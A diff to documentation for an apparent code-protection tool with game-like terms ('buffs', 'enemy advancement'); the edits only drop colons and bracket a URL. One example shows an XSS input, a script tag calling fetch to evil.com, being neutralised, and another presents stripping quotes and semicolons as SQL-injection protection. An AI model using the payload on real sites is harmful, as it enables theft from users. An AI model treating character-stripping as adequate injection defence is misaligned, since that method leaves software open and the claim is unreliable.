@@ -40,7 +40,7 @@ threat_detected = {
 bridge = CerberusCodexBridge()
 opportunities = bridge.process_threat_engagement(threat_detected, cerberus_response)
 
-# Bridge identifies:
+# Bridge identifies
 # - Threat type "injection" maps to T-A-R-L's "sanitize" feature
 # - Recommends using threat-detector module from Thirsty-lang
 ```
@@ -86,7 +86,7 @@ def _tarl_buff_check():
 if not _tarl_buff_check():
     pass  # Enemy advancement halted
 
-# ORIGINAL CODE NOW BUFFED:
+# ORIGINAL CODE NOW BUFFED
 def get_user(username, password):
     # T-A-R-L sanitization applied
     username = str(username).replace("'", "").replace('"', "").replace(";", "")
@@ -163,7 +163,7 @@ threat_detected = {
 # T-A-R-L morphs identifiers
 tarl.apply_stealth_buff(original_code, language="python")
 
-# BEFORE:
+# BEFORE
 def train_neural_network(training_data, learning_rate, epochs):
     model = NeuralNetwork()
     optimizer = AdamOptimizer(learning_rate)
@@ -172,7 +172,7 @@ def train_neural_network(training_data, learning_rate, epochs):
         optimizer.backward(loss)
     return model
 
-# AFTER (What attacker sees):
+# AFTER (What attacker sees)
 def _a3b5c7d9(_e8f2a1c4, _d9c8b7a6, _f1e2d3c4):
     _b6a5c4d3 = _c7d8e9f0()
     _a1b2c3d4 = _e5f6a7b8(_d9c8b7a6)
@@ -275,8 +275,8 @@ def handle_user_input(user_data):
 
 #### Step 3: What the Attacker Sees
 
-**Input:** `<script>fetch('https://evil.com...')</script>`
-**Output:** `fetch('https://evil.com...')`
+**Input:** `<script>fetch('<https://evil.com...>')</script>`
+**Output:** `fetch('<https://evil.com...>')`
 
 - No script tags execute
 - Attack neutralized
